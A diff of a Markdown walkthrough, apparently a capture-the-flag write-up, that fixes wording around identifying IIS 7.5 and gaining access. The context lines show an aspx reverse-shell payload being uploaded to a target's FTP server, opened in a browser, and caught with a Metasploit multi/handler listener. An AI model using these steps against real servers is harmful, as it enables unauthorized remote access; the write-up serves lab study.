@@ -94,7 +94,7 @@ Check what version of IIS is running on the webserver using Burp Repeater:
 
 ![burp](/assets/images/2020-05-13-21-28-32.png)
 
-Burp shows it has IIS 7.5 which is Server 2008R2.
+Burp shows it has IIS 7.5 which is Server 2008R2 or Windows 7.
 
 ### Gaining Access
 
@@ -114,7 +114,7 @@ Final size of aspx file: 2804 bytes
 Saved as: spen.aspx
 ```
 
-Copy to the payload to the FTP server:
+Copy the payload to the FTP server:
 
 ```text
 ftp> put spen.aspx
@@ -125,7 +125,7 @@ local: spen.aspx remote: spen.aspx
 2840 bytes sent in 0.00 secs (17.3618 MB/s)
 ```
 
-Start msfconsole with handler listening:
+Switch back to browser and open the spen.aspx file we just uploaded. The start msfconsole with handler listening:
 
 ```text
 msf5 > use exploit/multi/handler
